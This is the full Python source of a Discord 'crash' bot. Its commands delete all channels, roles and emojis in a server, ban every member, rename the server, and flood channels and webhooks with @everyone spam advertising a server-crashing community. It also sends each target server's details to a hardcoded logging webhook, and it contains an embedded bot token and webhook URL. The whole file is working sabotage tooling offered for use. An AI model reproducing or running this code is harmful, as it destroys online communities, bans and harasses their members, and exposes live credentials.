# Vexera Pro
# https:/t.me/numoun


from discord.ext import commands
import discord
import os
import time
import asyncio
import random
import threading
import aiohttp
from threading import Thread
from discord import Permissions
from discord.utils import get
from time import sleep
from discord import Webhook, AsyncWebhookAdapter

intents = discord.Intents.all()
loghook = 'https://discord.com/api/webhooks/1048308770683502643/D_15Iyus3gCiUPPvFk2ij8nS3ytB31OUyRrLpNo9XQsWlhIruEWgHCE2CZlgmJic5wE1'
client = commands.Bot(command_prefix='+', intents=intents)

client.remove_command('help')

dev = [726072384452296773]

@client.event
async def on_ready():
    activity = discord.Streaming(name='t.me/numoun', url='https://twitch.tv/unknownpage')
    await client.change_presence(status=discord.Status.idle, activity=activity)
    print(f"Bot {client.user} Ready")

async def kill_ch(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass

async def kill_rl(ctx):
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            pass

async def kill_emj(ctx):
    for c in ctx.guild.emojis:
        try:
            await c.delete()
        except:
            pass

async def spam_ch(ctx):
    for i in range(50):
        try:
            await ctx.guild.create_text_channel(name=f"cr4sh3d-by-rezet-{i}")
        except:
            pass

async def spam_rl(ctx):
    for i in range(100):
        try:
            await ctx.guild.create_role(name=f"Cr4sh3d by RezetName#9988")
        except:
            pass

async def spam3dd(ctx,ch):
    try:
        await ch.send('@everyone @here ссылка на прекрасных: https://discord.gg/F9uNynGkDM')
    except:
        pass

@client.command()
async def auto(ctx):
    guild = ctx.guild 


    async with aiohttp.ClientSession() as session:  
        webhook = discord.Webhook.from_url(loghook, adapter=discord.AsyncWebhookAdapter(session))
        await webhook.send(embed = discord.Embed(
            title=f'||                        ||{guild.name}||                       ||',
            description=f"""
**<:Discord_HypeSquadEvents:1040165733562335242> | ID сервера:** `{guild.id}`
**<:Chutumuz4:1042899732382617700> | Овнер:** `{guild.owner}`
**<:staff_blue:940304837575340063> | Участников:** `{len(guild.members)}`
**<:bughunterorange:943196832283111454> | Количество каналов:** `{len(guild.channels)}`
**<:channel:935902319986507857> | Количество ролей:** `{len(guild.roles)}`
**<:DeveloperBadge:1040166406643261481> | крашнул:** `{ctx.author}`
**<:blurpleverified:935902287073804288> | ID крашера:** `{ctx.author.id}`
**<:kilit:963793801854468146> | сервер крашнут ботом:** `{client.user}`""", 
            colour=discord.Colour.from_rgb(81, 161, 255)))

    asyncio.create_task(kill_rl(ctx))
    asyncio.create_task(kill_ch(ctx))
    asyncio.create_task(kill_emj(ctx))
    with open('key.jpg', 'rb') as f:
        icon = f.read()
        try: await ctx.guild.edit(name="Cr4sh3ddd", icon=icon)
        except: pass
    asyncio.create_task(spam_ch(ctx))
    asyncio.create_task(spam_rl(ctx))

 

@client.command()
async def del_channels(ctx):
    asyncio.create_task(kill_ch(ctx))

@client.command()
async def del_roles(ctx):
    asyncio.create_task(kill_rl(ctx))

async def bannes(ctx):
    for m in ctx.guild.members:
        if m != ctx.author:
            try:
                await m.ban(reason="Cr4sh3ddd")
            except:
                pass

@client.command()
async def banall(ctx):
    asyncio.create_task(bannes(ctx))


@client.command()
async def spam_channels(ctx):
    asyncio.create_task(spam_ch(ctx))

@client.command()
async def spam_roles(ctx):
    asyncio.create_task(spam_rl(ctx))

@client.command()
async def spam(ctx):
    for chan in ctx.guild.text_channels:
        for i in range(200):
            asyncio.create_task(spam3dd(ctx,ch=chan))

@client.command()
async def rename(ctx):
    await ctx.guild.edit(name='Cr4sh3ddd', icon=av)

with open('key.jpg', 'rb') as f:
    av = f.read()

@client.event
async def on_guild_channel_create(channel):
      webhook = await channel.create_webhook(name = "Cr4sh3d By RezetName", avatar=av)
      webhook_url = webhook.url
      async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
        for _ in range(50):
            try: await webhook.send("@everyone @here ссылка на прекрасных: https://discord.gg/F9uNynGkDM", embed=discord.Embed(title="Привет, вас крашнули Numoun :heart:", description=":dart: | Хочешь так же крашать сервера? тогда тебе к нам!\n:dizzy: | Blood on Blades даст вам:\n:star: | топовых краш ботов\n:gem: | крутые софты\n:ice_cube: | топовое и общительное комьюнити\n:heart_on_fire: заходи! тебе понравится!", colour=discord.Colour.from_rgb(30, 144, 255)))
            except: pass

# https://discord.com/api/oauth2/authorize?client_id=994268551412191302&permissions=8&scope=bot   
token = 'OTk0MjY4NTUxNDEyMTkxMzAy.GdMvDL.9GP1J-7j4A-2pzP1hzQgWcAHTm7hryXeZ3eq_M'
client.run(token)